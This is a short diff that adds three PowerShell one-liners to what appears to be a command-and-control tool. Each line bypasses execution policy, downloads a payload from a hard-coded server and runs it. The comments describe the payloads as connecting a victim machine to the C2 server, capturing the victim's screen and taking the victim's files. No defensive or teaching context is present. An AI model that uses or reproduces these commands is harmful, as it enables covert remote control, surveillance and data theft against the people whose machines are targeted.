@@ -1,0 +1,8 @@
+# This one is used for connecting the victim machine to the C2 server.
+powershell.exe -NoProfile -ExecutionPolicy Bypass -Command "iwr http://192.168.209.164:8084/payloads/agent.ps1 -UseBasicParsing | iex"
+
+# This one takes the screenhot of the victim's screen. (also embedded in the screenshot button in agents ui)
+powershell.exe -NoProfile -ExecutionPolicy Bypass -Command "iwr http://192.168.209.164:8084/payloads/1ss.ps1 -UseBasicParsing | iex"
+
+# If ran, this will get you the files and save it in uploads folder.
+powershell.exe -NoProfile -ExecutionPolicy Bypass -Command "iwr http://192.168.209.164:8084/payloads/fileupload.ps1 -UseBasicParsing | iex"
